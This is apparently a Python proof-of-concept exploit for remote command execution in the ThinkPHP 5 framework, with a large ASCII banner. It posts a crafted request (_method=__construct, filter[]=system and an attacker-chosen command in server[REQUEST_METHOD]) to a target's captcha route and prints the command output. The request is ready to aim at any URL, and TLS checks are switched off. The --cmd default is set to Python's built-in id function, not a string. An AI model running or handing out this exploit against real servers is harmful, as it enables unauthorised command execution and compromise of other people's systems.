import argparse
import textwrap

import requests
requests.packages.urllib3.disable_warnings()

def main(url, cmd):

    full_url = f"{url}/index.php?s=captcha"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": f"{cmd}"}
    try:
        response = requests.post(full_url, headers=headers, data=data, allow_redirects=False, verify=False, timeout=5)
        res = response.text.split("<!DOCTYPE html>")[0]
        print(f"[+]{cmd}命令执行的回显为:\n{res}")
    except Exception:
        print(f"[-]{url}请求失败")
if __name__ == '__main__':
    banner = """ 
              _____                    _____                    _____                    _____                            _____                    _____                                                    _____          
             /\    \                  /\    \                  /\    \                  /\    \                          /\    \                  /\    \                         ______                   /\    \         
            /::\____\                /::\    \                /::\    \                /::\    \                        /::\    \                /::\____\                       |::|   |                 /::\____\        
           /::::|   |               /::::\    \              /::::\    \              /::::\    \                       \:::\    \              /::::|   |                       |::|   |                /:::/    /        
          /:::::|   |              /::::::\    \            /::::::\    \            /::::::\    \                       \:::\    \            /:::::|   |                       |::|   |               /:::/    /         
         /::::::|   |             /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \                       \:::\    \          /::::::|   |                       |::|   |              /:::/    /          
        /:::/|::|   |            /:::/__\:::\    \        /:::/  \:::\    \        /:::/__\:::\    \                       \:::\    \        /:::/|::|   |                       |::|   |             /:::/    /           
       /:::/ |::|   |           /::::\   \:::\    \      /:::/    \:::\    \      /::::\   \:::\    \                      /::::\    \      /:::/ |::|   |                       |::|   |            /:::/    /            
      /:::/  |::|___|______    /::::::\   \:::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \            ____    /::::::\    \    /:::/  |::|   | _____                 |::|   |           /:::/    /      _____  
     /:::/   |::::::::\    \  /:::/\:::\   \:::\    \  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \          /\   \  /:::/\:::\    \  /:::/   |::|   |/\    \          ______|::|___|___ ____  /:::/____/      /\    \ 
    /:::/    |:::::::::\____\/:::/  \:::\   \:::\____\/:::/____/     \:::|    |/:::/__\:::\   \:::\____\        /::\   \/:::/  \:::\____\/:: /    |::|   /::\____\        |:::::::::::::::::|    ||:::|    /      /::\____\
    \::/    / ~~~~~/:::/    /\::/    \:::\  /:::/    /\:::\    \     /:::|____|\:::\   \:::\   \::/    /        \:::\  /:::/    \::/    /\::/    /|::|  /:::/    /        |:::::::::::::::::|____||:::|____\     /:::/    /
     \/____/      /:::/    /  \/____/ \:::\/:::/    /  \:::\    \   /:::/    /  \:::\   \:::\   \/____/          \:::\/:::/    / \/____/  \/____/ |::| /:::/    /          ~~~~~~|::|~~~|~~~       \:::\    \   /:::/    / 
                 /:::/    /            \::::::/    /    \:::\    \ /:::/    /    \:::\   \:::\    \               \::::::/    /                   |::|/:::/    /                 |::|   |           \:::\    \ /:::/    /  
                /:::/    /              \::::/    /      \:::\    /:::/    /      \:::\   \:::\____\               \::::/____/                    |::::::/    /                  |::|   |            \:::\    /:::/    /   
               /:::/    /               /:::/    /        \:::\  /:::/    /        \:::\   \::/    /                \:::\    \                    |:::::/    /                   |::|   |             \:::\__/:::/    /    
              /:::/    /               /:::/    /          \:::\/:::/    /          \:::\   \/____/                  \:::\    \                   |::::/    /                    |::|   |              \::::::::/    /     
             /:::/    /               /:::/    /            \::::::/    /            \:::\    \                       \:::\    \                  /:::/    /                     |::|   |               \::::::/    /      
            /:::/    /               /:::/    /              \::::/    /              \:::\____\                       \:::\____\                /:::/    /                      |::|   |                \::::/    /       
            \::/    /                \::/    /                \::/____/                \::/    /                        \::/    /                \::/    /                       |::|___|                 \::/____/        
             \/____/                  \/____/                  ~~                       \/____/                          \/____/                  \/____/                         ~~                       ~~              

                                                                         Version:0.0.1
                                                                         Author :Mr.XU
    """
    print(banner)
    parser = argparse.ArgumentParser(description='thinkphp5 rce poc',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            cve-2022-4334-rce.py -u http://192.168.1.108
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, default=id ,help=" example: whoami")
    args = parser.parse_args()

    main(args.url,args.cmd)
